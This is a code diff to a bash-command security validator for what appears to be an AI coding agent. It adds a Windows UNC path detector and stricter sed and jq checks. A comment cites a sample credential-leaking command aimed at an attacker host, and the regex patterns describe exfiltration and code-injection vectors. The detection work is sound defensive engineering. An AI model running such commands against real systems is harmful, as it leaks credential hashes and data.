@@ -69,6 +69,7 @@ const CHECK_IDS = {
   PS4_TRACE_RCE: 67,
   ARITHMETIC_CONDITIONAL_INJECTION: 68,
   DESTRUCTIVE_TMUX: 69,
+  UNC_PATH: 70,
 } as const;
 
 // eslint-disable-next-line no-control-regex
@@ -725,6 +726,17 @@ function checkSedSegment(seg: string): SecurityCheckResult {
   const trimmed = seg.trim();
   const sedArgs = trimmed.replace(/^.*?\bsed\b\s*/, '');
 
+  // Fail closed on malformed quoting. AMI extracts sed expressions with
+  // quote-delimited regexes; an unbalanced quote makes that extraction
+  // unreliable (a `w FILE` / `e` command can hide in the mis-tokenized tail), so
+  // a sed segment whose quotes do not balance cannot be statically proven safe
+  // and is rejected rather than auto-approved. Parity with Claude Code's
+  // tryParseShellCommand throw → deny / hasFileArgs→true-on-parse-failure
+  // (sedValidation.ts L247-260).
+  if (hasUnbalancedQuotes(sedArgs)) {
+    return fail(CHECK_IDS.SED_DANGEROUS, 'sed command has unbalanced quoting and cannot be statically verified as safe');
+  }
+
   // Block non-ASCII characters in sed expressions (potential injection)
   if (/[^\x00-\x7F]/.test(sedArgs)) {
     return fail(CHECK_IDS.SED_DANGEROUS, 'sed expression contains non-ASCII characters');
@@ -796,9 +808,12 @@ function validateJqDangerous(command: string): SecurityCheckResult {
   // jq file-reading / module-loading flags: --rawfile/--slurpfile read an
   // arbitrary file's contents into a variable (arbitrary-read / exfil), and
   // -L/--library-path loads jq modules from an attacker-chosen directory
-  // (code-load). `-f/--from-file` is intentionally NOT blocked — loading the
-  // filter program from a file is ordinary jq usage and the program itself is
-  // still sandboxed (system() is caught above).
+  // (code-load). `-f/--from-file` is intentionally NOT hard-blocked here —
+  // loading the filter program from a file is ordinary jq usage. Claude Code's
+  // jq flag check (utils/bash/ast.ts L2604-2609) returns ok:false for -f, which
+  // feeds its AUTO-APPROVAL (ask) decision, not a hard execution deny; AMI maps
+  // that to classifyBashCommand → 'unsafe' (approval required), so `jq -f` is
+  // already gated at the correct layer without over-refusing it outright.
   if (/\bjq\b/.test(command) && /(?:^|\s)(?:--rawfile|--slurpfile|-L|--library-path)\b/.test(command)) {
     return fail(CHECK_IDS.JQ_DANGEROUS, 'jq --rawfile/--slurpfile/-L/--library-path can read arbitrary files or load code from an arbitrary path');
   }
@@ -920,6 +935,61 @@ function validateBacktickInjection(command: string): SecurityCheckResult {
   const cleaned = command.replace(/\\`/g, '');
   if (/`[^`]+`/.test(cleaned)) {
     return fail(CHECK_IDS.BACKTICK_INJECTION, 'Backtick command substitution can execute arbitrary commands; use $() instead');
+  }
+  return PASS;
+}
+
+/**
+ * Detect a Windows UNC path (`\\server\share`, `//server/share`, WebDAV and
+ * IP/IPv6 variants) in a path or command. A UNC reference makes Windows resolve
+ * the host over SMB/WebDAV, which triggers NTLM/Kerberos authentication — an
+ * attacker-controlled host can harvest the credential hash or exfiltrate data
+ * even from an otherwise "read-only" command (`cat \\attacker.com\x`). Parity
+ * with Claude Code's `containsVulnerableUncPath`
+ * (utils/shell/readOnlyCommandValidation.ts:L1562-1638).
+ *
+ * UNC semantics are Windows-only — on POSIX a `\\host\share` token is just a
+ * literal filename with no network side effect — so the check is gated on the
+ * platform. `platform` is injectable so the Windows behavior is testable on any
+ * host and so the real bash-security entry point can thread the sandbox's host
+ * platform through.
+ */
+export function containsVulnerableUncPath(
+  pathOrCommand: string,
+  platform: NodeJS.Platform = process.platform,
+): boolean {
+  if (platform !== 'win32') return false;
+
+  // 1. Backslash UNC: \\server, \\server\share, \\server@port\share. The host
+  //    class excludes `@` so the host run and the optional `@port`/`@ssl` marker
+  //    are disjoint — matching is linear with no ambiguous overlap.
+  // eslint-disable-next-line security/detect-unsafe-regex -- host class [^\s\\/@]+ is disjoint from the following `@…` and `[\\/]|$|\s` arms; linear, run via .test() on bounded command strings
+  if (/\\\\[^\s\\/@]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i.test(pathOrCommand)) return true;
+  // 2. Forward-slash UNC: //server/share — exclude URL schemes (https://) via the
+  //    non-colon lookbehind so `https://x` is not misread as `//x`.
+  // eslint-disable-next-line security/detect-unsafe-regex -- host class [^\s\\/@]+ is disjoint from the following `@…` and `[\\/]|$|\s` arms; linear, run via .test() on bounded command strings
+  if (/(?<!:)\/\/[^\s\\/@]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i.test(pathOrCommand)) return true;
+  // 3. Mixed separators: `/\\server` (bash collapses `/\\` → `/\`, a UNC path).
+  if (/\/\\{2,}[^\s\\/]/.test(pathOrCommand)) return true;
+  // 4. Mixed separators: `\\/server`.
+  if (/\\{2,}\/[^\s\\/]/.test(pathOrCommand)) return true;
+  // 5. WebDAV SSL/port markers: \\server@SSL@8443\, \\server@8443@SSL\.
+  if (/@SSL@\d+/i.test(pathOrCommand) || /@\d+@SSL/i.test(pathOrCommand)) return true;
+  // 6. WebDAV redirector marker.
+  if (/DavWWWRoot/i.test(pathOrCommand)) return true;
+  // 7. IPv4 UNC host.
+  if (/^\\\\(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand) ||
+      /^\/\/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand)) return true;
+  // 8. Bracketed IPv6 UNC host.
+  if (/^\\\\(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand) ||
+      /^\/\/(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand)) return true;
+
+  return false;
+}
+
+function validateUncPath(command: string, platform: NodeJS.Platform): SecurityCheckResult {
+  if (containsVulnerableUncPath(command, platform)) {
+    return fail(CHECK_IDS.UNC_PATH, 'Command contains a Windows UNC path that could leak credentials or exfiltrate data over SMB/WebDAV');
   }
   return PASS;
 }
@@ -1268,7 +1338,7 @@ const MAX_AUTO_APPROVE_LENGTH = 10_000;
  */
 export const MAX_SUBCOMMANDS_FOR_SECURITY_CHECK = 50;
 
-export function validateBashSecurity(command: string, options?: { detachedMode?: boolean; worktreeIsolation?: boolean; relaxDetachedValidators?: boolean }): SecurityCheckResult {
+export function validateBashSecurity(command: string, options?: { detachedMode?: boolean; worktreeIsolation?: boolean; relaxDetachedValidators?: boolean; platform?: NodeJS.Platform }): SecurityCheckResult {
   // Measure the UTF-8 BYTE length, not `.length` (UTF-16 code units): a BMP
   // character (CJK etc.) is one code unit but up to three UTF-8 bytes, so
   // `.length` under-reports by up to 3× and would let a long multibyte command
@@ -1305,11 +1375,18 @@ export function validateBashSecurity(command: string, options?: { detachedMode?:
   // destructive-command guards (git credential theft, nuclear rm, dd, source/
   // eval, etc.) always run in BOTH modes regardless of this flag.
   const relaxDetached = detached && options?.relaxDetachedValidators === true;
+  const platform = options?.platform ?? process.platform;
   let result: SecurityCheckResult;
 
   // Invisible Unicode check — must run FIRST, before any pattern matching,
   // because zero-width characters can split tokens and evade all regexes below.
   result = validateInvisibleUnicode(command);
+  if (!result.safe) return result;
+
+  // Windows UNC path — must run early, before any read-only auto-allow
+  // classification, because resolving a UNC host triggers SMB/WebDAV auth
+  // (NTLM-hash theft / data exfil). No-op on non-Windows platforms.
+  result = validateUncPath(command, platform);
   if (!result.safe) return result;
 
   // Pre-validators (run before any content extraction)
